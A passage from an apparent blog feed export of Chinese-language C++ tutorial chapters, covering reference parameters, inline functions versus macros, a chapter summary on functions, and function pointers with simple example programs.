(<code>class_type&amp;</code>)。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    Student(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; n) : name(n) &#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">add_grade</span><span class="params">(<span class="keyword">int</span> g)</span> </span>&#123; grades.push_back(g); &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">print_info</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="comment">// const 成员函数</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Student: &quot;</span> &lt;&lt; name &lt;&lt; <span class="string">&quot;, Grades: &quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> g : grades) &#123;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; g &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; <span class="title">get_name</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> name; &#125; <span class="comment">// 返回常量引用</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> name;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; grades;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 按常量引用传递类对象</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show_student_summary</span><span class="params">(<span class="keyword">const</span> Student&amp; s)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Summary for &quot;</span> &lt;&lt; s.get_name() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    s.print_info(); <span class="comment">// 可以调用 const 成员函数</span></span><br><span class="line">    <span class="comment">// s.add_grade(100); // 错误！不能通过 const 引用调用非 const 成员函数</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="function">Student <span class="title">alice</span><span class="params">(<span class="string">&quot;Alice&quot;</span>)</span></span>;</span><br><span class="line">    alice.add_grade(<span class="number">95</span>);</span><br><span class="line">    alice.add_grade(<span class="number">88</span>);</span><br><span class="line"></span><br><span class="line">    show_student_summary(alice); <span class="comment">// 高效传递，不复制</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="8-2-6-对象、继承和引用"><a href="#8-2-6-对象、继承和引用" class="headerlink" title="8.2.6 对象、继承和引用"></a>8.2.6 对象、继承和引用</h2><p>当与类继承结合使用时，基类的引用可以指向派生类的对象。这是实现<strong>多态 (Polymorphism)</strong> 的关键机制之一（与指针类似）。通过基类引用调用虚函数时，会执行派生类中相应的版本。这部分内容将在后续章节（如第 13 章）详细介绍。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 概念预览 (将在后续章节详细讲解)</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Base</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">show</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Base::show()&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; &#125;</span><br><span class="line">    <span class="keyword">virtual</span> ~Base() &#123;&#125; <span class="comment">// 虚析构函数</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Derived</span> :</span> <span class="keyword">public</span> Base &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">()</span> <span class="keyword">const</span> <span class="keyword">override</span> </span>&#123; <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Derived::show()&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">display</span><span class="params">(<span class="keyword">const</span> Base&amp; obj)</span> </span>&#123; <span class="comment">// 参数是基类的常量引用</span></span><br><span class="line">    obj.show(); <span class="comment">// 调用虚函数，会根据 obj 实际引用的对象类型执行相应版本</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Base b;</span><br><span class="line">    Derived d;</span><br><span class="line"></span><br><span class="line">    display(b); <span class="comment">// 输出: Base::show()</span></span><br><span class="line">    display(d); <span class="comment">// 输出: Derived::show() (多态行为)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="8-2-7-何时使用引用参数"><a href="#8-2-7-何时使用引用参数" class="headerlink" title="8.2.7 何时使用引用参数"></a>8.2.7 何时使用引用参数</h2><p>选择使用值传递、指针传递还是引用传递取决于具体需求：</p><ol><li><p><strong>按值传递 (<code>type param</code>)</strong>:</p><ul><li>  适用于小型数据类型（<code>int</code>, <code>double</code>, <code>bool</code>, 指针本身）。</li><li>  当函数需要操作数据的副本而不影响原始数据时。</li><li>  简单易懂。</li></ul></li><li><p><strong>按指针传递 (<code>type* param</code>)</strong>:</p><ul><li>  当函数需要修改调用者的原始数据时（传统 C 风格）。</li><li>  当需要表示“可选”参数（可以传递 <code>nullptr</code>）时。</li><li>  与 C 库或旧代码交互时。</li><li>  传递大型对象以避免复制开销（但通常引用更受欢迎）。</li></ul></li><li><p><strong>按引用传递 (<code>type&amp; param</code>)</strong>:</p><ul><li>  当函数<strong>需要修改</strong>调用者的原始数据时（C++ 风格，通常比指针更简洁安全）。</li><li>  传递大型对象（结构、类）以<strong>避免复制开销</strong>，但函数<strong>不需要修改</strong>对象时，应使用**常量引用 (<code>const type&amp; param</code>)**。这是 C++ 中非常常见的做法，兼具效率和安全性。</li></ul></li></ol><p><strong>经验法则:</strong></p><ul><li>  对于内置类型和小型结构，优先考虑<strong>按值传递</strong>。</li><li>  对于需要修改调用者数据的大型对象或函数，使用<strong>按引用传递</strong> (<code>type&amp;</code>)。</li><li>  对于不需要修改调用者数据的大型对象，使用<strong>按常量引用传递</strong> (<code>const type&amp;</code>) 以提高效率和安全性。</li><li>  在需要表示可选参数或与 C 风格代码交互时，考虑使用<strong>按指针传递</strong> (<code>type*</code>)。</li></ul><p>引用是 C++ 中一个强大且常用的特性，尤其是在函数参数和返回值中，它提供了指针之外的另一种处理间接访问和避免复制的方式。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>8.1 C++ 内联函数</title>
      <link href="2025/04/26/8.1_C++%E5%86%85%E8%81%94%E5%87%BD%E6%95%B0/"/>
      <url>2025/04/26/8.1_C++%E5%86%85%E8%81%94%E5%87%BD%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<p>常规的函数调用过程涉及一些开销：程序需要跳转到函数的内存地址，保存当前执行状态（如寄存器值），将参数复制到栈上，执行函数代码，存储返回值，恢复执行状态，然后跳转回调用点。对于非常短小且频繁调用的函数，这些开销可能会变得显著，影响程序性能。</p><p><strong>内联函数 (Inline Function)</strong> 是 C++ 提供的一种优化机制，旨在减少这种函数调用开销。其基本思想是：建议编译器在<strong>编译时</strong>将函数的实际代码直接<strong>替换</strong>到每个调用该函数的地方，而不是执行常规的函数调用跳转。</p><h2 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h2><p>要建议编译器将一个函数视为内联函数，可以在函数定义前加上 <code>inline</code> 关键字。</p><p><strong>语法:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">inline</span> return_type <span class="title">function_name</span><span class="params">(parameter_list)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 函数体</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个简单的内联函数</span></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">double</span> <span class="title">square</span><span class="params">(<span class="keyword">double</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x * x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">double</span> a = <span class="number">5.0</span>;</span><br><span class="line">    <span class="keyword">double</span> b;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用内联函数</span></span><br><span class="line">    b = square(a); <span class="comment">// 编译器可能会将这里替换为: b = a * a;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;a = &quot;</span> &lt;&lt; a &lt;&lt; <span class="string">&quot;, a squared = &quot;</span> &lt;&lt; b &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">double</span> c = square(<span class="number">1.5</span> + <span class="number">2.5</span>); <span class="comment">// 编译器可能会替换为: double c = (1.5 + 2.5) * (1.5 + 2.5);</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;(1.5 + 2.5) squared = &quot;</span> &lt;&lt; c &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>代码解释:</strong></p><ul><li>  <code>square</code> 函数被声明为 <code>inline</code>。</li><li>  在 <code>main</code> 函数中调用 <code>square(a)</code> 时，编译器<strong>可能</strong>会直接用 <code>a * a</code> 的代码替换这次调用，避免了函数调用的开销。</li><li>  同样，<code>square(1.5 + 2.5)</code> 可能被替换为 <code>(1.5 + 2.5) * (1.5 + 2.5)</code>。</li></ul><h2 id="inline-的特性和注意事项"><a href="#inline-的特性和注意事项" class="headerlink" title="inline 的特性和注意事项"></a><code>inline</code> 的特性和注意事项</h2><ol><li><p> <strong>建议而非命令:</strong> <code>inline</code> 关键字只是向编译器提出的一个<strong>建议</strong>。编译器会根据自己的优化策略来决定是否真的进行内联。如果函数体过于复杂（例如包含循环、递归、大量代码），或者编译器认为内联不会带来好处（甚至可能有害），它可能会忽略 <code>inline</code> 建议，仍然执行常规的函数调用。</p></li><li><p> <strong>适用于小型函数:</strong> 内联最适合那些代码量小、执行速度快且被频繁调用的函数。如果内联一个大函数，可能会导致最终生成的可执行代码体积显著增大（代码膨胀），反而降低性能（因为更大的代码可能导致更多的缓存未命中）。</p></li><li><p><strong>定义位置:</strong> 为了让编译器能够在调用点展开函数代码，内联函数的<strong>定义</strong>（而不仅仅是原型）通常需要放在调用该函数的每个源文件中。最常见的做法是将内联函数的定义直接放在<strong>头文件</strong>中。这样，包含该头文件的所有源文件都能看到完整的函数定义，编译器就有机会进行内联。</p><ul><li>  注意：将函数定义放在头文件中对于非内联函数通常是错误的（会导致链接错误，因为同一个函数会在多个编译单元中定义），但对于内联函数是允许且必要的。</li></ul></li><li><p><strong>类定义中的函数:</strong> 在类（<code>class</code> 或 <code>struct</code>）定义内部实现的成员函数<strong>默认</strong>就是内联的，不需要显式添加 <code>inline</code> 关键字。</p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">getValue</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> value; &#125; <span class="comment">// 默认是内联的</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> value;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol><h2 id="内联函数-vs-宏-define"><a href="#内联函数-vs-宏-define" class="headerlink" title="内联函数 vs. 宏 (#define)"></a>内联函数 vs. 宏 (<code>#define</code>)</h2><p>在 C 语言中，有时会使用带参数的宏（<code>#define</code>）来模拟类似内联函数的效果，以避免函数调用开销。例如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SQUARE(X) ((X)*(X)) <span class="comment">// C 风格宏</span></span></span><br></pre></td></tr></table></figure><p>然而，宏存在一些缺点：</p><ul><li>  <strong>类型不安全:</strong> 宏只是简单的文本替换，不进行类型检查。</li><li>  <strong>意外的副作用:</strong> 如果参数带有副作用（如 <code>SQUARE(i++)</code>），可能会导致意想不到的结果，因为参数会被多次求值 (<code>((i++)*(i++))</code>）。</li><li>  <strong>调试困难:</strong> 宏在预处理阶段就被替换掉了，调试器通常看不到宏的原始形式。</li><li>  <strong>作用域问题:</strong> 宏不受 C++ 的作用域规则约束。</li></ul><p>内联函数克服了这些缺点：</p><ul><li>  <strong>类型安全:</strong> 内联函数遵循正常的函数类型检查规则。</li><li>  <strong>参数求值:</strong> 参数只会被求值一次。</li><li>  <strong>可调试:</strong> 内联函数仍然是真正的函数，可以用调试器进行调试（尽管内联后的代码可能看起来不同）。</li><li>  <strong>遵循作用域:</strong> 内联函数遵循 C++ 的作用域和访问规则。</li></ul><p>因此，在 C++ 中，应优先使用内联函数而不是带参数的宏来实现简单的、需要避免调用开销的功能。</p><p><strong>总结:</strong></p><p>内联函数是 C++ 提供的一种性能优化建议，通过在编译时将函数代码替换到调用点来减少函数调用开销。它特别适用于短小且频繁调用的函数。<code>inline</code> 关键字只是一个建议，编译器有最终决定权。为了使内联成为可能，通常需要将内联函数的定义放在头文件中。相比 C 风格的宏，内联函数提供了类型安全和更可预测的行为。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>7.11 总结</title>
      <link href="2025/04/26/7.11_%E6%80%BB%E7%BB%93/"/>
      <url>2025/04/26/7.11_%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>本章深入探讨了函数这一 C++ 编程的基本模块，涵盖了函数定义、调用、参数传递机制以及如何将函数与各种数据类型（数组、字符串、结构、对象）结合使用。</p><p>主要内容回顾：</p><ol><li><p> <strong>函数基础:</strong> 复习了函数的定义（返回类型、名称、参数列表、函数体）、函数原型（声明函数接口以供编译器使用）和函数调用（执行函数代码）。</p></li><li><p><strong>参数传递:</strong></p><ul><li>  <strong>按值传递 (Pass by Value):</strong> C++ 的默认方式，适用于基本类型、结构和类对象。函数操作的是实参的副本，不影响原始数据，但可能因复制大型对象而效率低下。</li><li>  <strong>数组传递:</strong> C 风格数组传递时会退化为指向首元素的指针，函数直接操作原始数组，效率高但丢失大小信息，需额外传递大小或使用指针区间。<code>const</code> 可用于保护数组内容。</li><li>  <strong>二维数组传递:</strong> 必须在函数参数中指定除第一维之外的所有维度的大小。</li><li>  <strong>结构传递:</strong> 默认按值传递。为提高效率或允许修改，可传递结构指针 (<code>struct_type*</code>)，使用 <code>-&gt;</code> 访问成员，或使用引用（第 8 章内容）。</li><li>  <strong><code>std::string</code> 和 <code>std::array</code> 对象传递:</strong> 默认按值传递，但通常推荐<strong>按常量引用 (<code>const T&amp;</code>)</strong> 传递以获得效率和安全性，或按引用 (<code>T&amp;</code>) 传递以允许修改。</li></ul></li><li><p><strong>函数与特定类型:</strong></p><ul><li>  <strong>C-风格字符串:</strong> 作为 <code>char*</code> 传递，依赖 <code>\0</code> 结束符。返回 C 风格字符串比较复杂，推荐让调用者提供缓冲区。</li><li>  <strong><code>std::string</code> 对象:</strong> 使用 <code>const std::string&amp;</code> 传递是常用方式。返回 <code>std::string</code> 通常因 RVO/NRVO 而高效。</li><li>  <strong><code>std::array</code> 对象:</strong> 行为类似结构，大小是类型的一部分。推荐使用 <code>const std::array&lt;T, N&gt;&amp;</code> 传递。</li></ul></li><li><p> <strong>递归:</strong> 函数调用自身来解决问题。需要明确的<strong>基线条件</strong>来停止递归，以及使问题规模缩小的<strong>递归步骤</strong>。递归可以使某些问题的代码简洁，但可能效率低或导致栈溢出。</p></li><li><p> <strong>函数指针:</strong> 指向函数地址的指针变量。允许将函数作为参数传递、在运行时选择函数等。声明时需匹配函数签名（返回类型和参数类型）。<code>typedef</code> 或 <code>using</code> 可简化其声明。</p></li></ol><p>通过本章的学习，我们掌握了如何有效地定义和使用函数来构建模块化、可重用和可维护的 C++ 程序，并了解了不同数据类型在函数参数传递中的行为和最佳实践。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>7.10 函数指针</title>
      <link href="2025/04/26/7.10_%E5%87%BD%E6%95%B0%E6%8C%87%E9%92%88/"/>
      <url>2025/04/26/7.10_%E5%87%BD%E6%95%B0%E6%8C%87%E9%92%88/</url>
      
        <content type="html"><![CDATA[<p>就像变量有地址，函数也有地址。<strong>函数指针 (Function Pointer)</strong> 就是一个指向函数内存地址的指针变量。通过函数指针，我们可以像调用普通函数一样调用它所指向的函数。函数指针的主要用途包括：</p><ul><li>  将函数作为参数传递给其他函数（例如，实现回调机制或策略模式）。</li><li>  在运行时决定调用哪个函数。</li><li>  构建函数表或调度表。</li></ul><h2 id="7-10-1-函数指针的基础知识"><a href="#7-10-1-函数指针的基础知识" class="headerlink" title="7.10.1 函数指针的基础知识"></a>7.10.1 函数指针的基础知识</h2><p><strong>声明函数指针:</strong></p><p>声明函数指针时，必须指定它所指向的函数的<strong>返回类型</strong>和<strong>参数列表类型</strong>。这确保了类型安全，即函数指针只能指向具有匹配签名的函数。</p><p><strong>语法:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return_type (*pointer_name)(parameter_type_list);</span><br></pre></td></tr></table></figure><ul><li>  <code>return_type</code>: 函数指针指向的函数的返回类型。</li><li>  <code>pointer_name</code>: 函数指针变量的名称。</li><li>  <code>parameter_type_list</code>: 函数指针指向的函数的参数类型列表，用逗号分隔。</li><li>  <code>(*pointer_name)</code>: 括号是必需的，它表明 <code>pointer_name</code> 是一个指针。如果没有括号，<code>return_type *pointer_name(parameter_type_list);</code> 会被解释为一个返回 <code>return_type*</code> 类型的函数声明。</li></ul><p><strong>示例声明:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 声明一个名为 func_ptr 的函数指针</span></span><br><span class="line"><span class="comment">// 它指向一个接受两个 int 参数并返回 int 的函数</span></span><br><span class="line"><span class="keyword">int</span> (*func_ptr)(<span class="keyword">int</span>, <span class="keyword">int</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 声明一个名为 process 的函数指针</span></span><br><span class="line"><span class="comment">// 它指向一个接受 const char* 参数且无返回值 (void) 的函数</span></span><br><span class="line"><span class="keyword">void</span> (*process)(<span class="keyword">const</span> <span class="keyword">char</span>*);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 声明一个名为 compare 的函数指针</span></span><br><span class="line"><span class="comment">// 它指向一个接受两个 double 参数并返回 bool 的函数</span></span><br><span class="line"><span class="keyword">bool</span> (*compare)(<span class="keyword">double</span>, <span class="keyword">double</span>);</span><br></pre></td></tr></table></figure><p><strong>初始化函数指针:</strong></p><p>可以将函数的名称（不带括号）直接赋给具有匹配签名的函数指针。函数名本身就代表了函数的地址。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span>&#123; <span class="keyword">return</span> a + b; &#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_message</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* msg)</span> </span>&#123; <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; msg &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化 func_ptr 指向 add 函数</span></span><br><span class="line">func_ptr = add; <span class="comment">// 或者 func_ptr = &amp;add; (&amp; 是可选的)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化 process 指向 print_message 函数</span></span><br><span class="line">process = print_message;</span><br></pre></td></tr></table></figure><p><strong>使用函数指针调用函数:</strong></p><p>可以通过函数指针来调用它所指向的函数，语法与直接调用函数类似。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> result = func_ptr(<span class="number">5</span>, <span class="number">3</span>); <span class="comment">// 调用 add(5, 3)，result 将是 8</span></span><br><span class="line">process(<span class="string">&quot;Hello via pointer!&quot;</span>); <span class="comment">// 调用 print_message(&quot;Hello via pointer!&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 也可以使用显式解引用语法 (较少见)</span></span><br><span class="line"><span class="comment">// int result = (*func_ptr)(5, 3);</span></span><br><span class="line"><span class="comment">// (*process)(&quot;Hello via pointer!&quot;);</span></span><br></pre></td></tr></table></figure><h2 id="7-10-2-函数指针示例"><a href="#7-10-2-函数指针示例" class="headerlink" title="7.10.2 函数指针示例"></a>7.10.2 函数指针示例</h2><p>下面是一个完整的示例，演示如何声明、初始化和使用函数指针。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 目标函数 1</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x + y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 目标函数 2</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">subtract</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x - y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 目标函数 3</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">display_result</span><span class="params">(<span class="keyword">int</span> result)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;The result is: &quot;</span> &lt;&lt; result &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 声明一个指向接受两个 int 并返回 int 的函数的指针</span></span><br><span class="line">    <span class="keyword">int</span> (*operation)(<span class="keyword">int</span>, <span class="keyword">int</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 声明一个指向接受一个 int 且无返回值的函数的指针</span></span><br><span class="line">    <span class="keyword">void</span> (*show)(<span class="keyword">int</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将 operation 指向 add 函数</span></span><br><span class="line">    operation = add;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Using &#x27;add&#x27; function via pointer:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">int</span> sum = operation(<span class="number">10</span>, <span class="number">5</span>); <span class="comment">// 调用 add(10, 5)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;10 + 5 = &quot;</span> &lt;&lt; sum &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出: 15</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将 operation 指向 subtract 函数</span></span><br><span class="line">    operation = subtract;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nUsing &#x27;subtract&#x27; function via pointer:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span 